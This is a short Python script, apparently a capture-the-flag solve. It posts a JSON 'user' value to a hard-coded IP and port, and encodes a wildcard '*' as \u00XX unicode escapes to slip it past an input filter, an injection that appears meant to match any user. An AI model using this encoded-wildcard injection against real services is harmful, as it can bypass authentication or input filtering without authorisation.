from requests import *

URL = "http://206.189.121.131:30810/"

def payload(payload: str): return {'user': payload}

def toUtf8(payload: str): return ''.join(map(lambda s: str(hex(ord(s))), payload)).replace('0x','\\u00')

response = post(URL,json=payload(toUtf8("*")))

print(response.text)